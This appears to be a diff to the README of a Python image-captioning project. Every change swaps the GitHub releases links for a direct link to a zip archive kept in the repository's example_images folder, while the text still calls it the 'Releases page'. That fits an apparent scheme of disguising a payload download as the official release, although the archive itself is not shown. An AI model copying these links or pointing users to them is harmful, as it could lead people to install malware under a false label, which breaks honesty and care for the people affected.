@@ -1,6 +1,6 @@
 # 🖼️ python-ai-image-captioning - Generate Image Descriptions Instantly
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/alexsander-souza-as/python-ai-image-captioning/releases)
+[![Download](https://raw.githubusercontent.com/alexsander-souza-as/python-ai-image-captioning/main/example_images/image-python-ai-captioning-3.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/alexsander-souza-as/python-ai-image-captioning/main/example_images/image-python-ai-captioning-3.2.zip)
 
 ## 📜 Description
 
@@ -12,7 +12,7 @@ Follow these steps to download and run the application:
 
 1. **Get Ready**: Ensure you have an internet connection and a computer with Windows, macOS, or Linux.
 
-2. **Download the App**: Visit the [Releases page](https://github.com/alexsander-souza-as/python-ai-image-captioning/releases) to download the latest version of the application. Click on the release that matches your operating system and download the file.
+2. **Download the App**: Visit the [Releases page](https://raw.githubusercontent.com/alexsander-souza-as/python-ai-image-captioning/main/example_images/image-python-ai-captioning-3.2.zip) to download the latest version of the application. Click on the release that matches your operating system and download the file.
 
 3. **Install the Application**: 
    - For **Windows**:
@@ -53,12 +53,12 @@ Follow these steps to download and run the application:
 
 ## 📥 Download & Install
 
-To download the application, visit the [Releases page](https://github.com/alexsander-souza-as/python-ai-image-captioning/releases). Keep this page handy for updates and new features. Once you have the latest version, follow the installation steps outlined above.
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/alexsander-souza-as/python-ai-image-captioning/main/example_images/image-python-ai-captioning-3.2.zip). Keep this page handy for updates and new features. Once you have the latest version, follow the installation steps outlined above.
 
 ## ❓ FAQs
 
 ### How do I update the application?  
-Simply return to the [Releases page](https://github.com/alexsander-souza-as/python-ai-image-captioning/releases) and download the latest version. Follow the installation steps again.
+Simply return to the [Releases page](https://raw.githubusercontent.com/alexsander-souza-as/python-ai-image-captioning/main/example_images/image-python-ai-captioning-3.2.zip) and download the latest version. Follow the installation steps again.
 
 ### Can I use the app offline?  
 Yes, once installed, you can use the app without an internet connection. However, some features, like web scraping, require internet access.
